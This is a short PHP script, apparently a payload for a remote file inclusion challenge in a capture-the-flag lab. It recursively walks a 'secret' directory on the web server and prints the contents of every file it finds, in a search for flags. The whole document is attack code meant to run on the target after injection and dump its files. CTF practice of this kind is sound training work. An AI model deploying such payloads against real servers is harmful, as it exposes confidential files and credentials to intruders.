<?php

$target = "/var/www/html/rfi/secret/";

echo "<h2>Searching for flags...</h2>";

function searchFiles($dir) {

    $files = scandir($dir);

    foreach ($files as $file) {

        if ($file === "." || $file === "..") {
            continue;
        }

        $path = $dir . "/" . $file;

        if (is_dir($path)) {

            searchFiles($path);

        } else {

            echo "<hr>";
            echo "<b>File:</b> " . htmlspecialchars($path) . "<br>";

            $content = @file_get_contents($path);

            if ($content !== false) {

                echo "<pre>";
                echo htmlspecialchars($content);
                echo "</pre>";

            } else {

                echo "Cannot read file";
            }
        }
    }
}

if (is_dir($target)) {

    searchFiles($target);

} else {

    echo "Directory not found";

}

?>
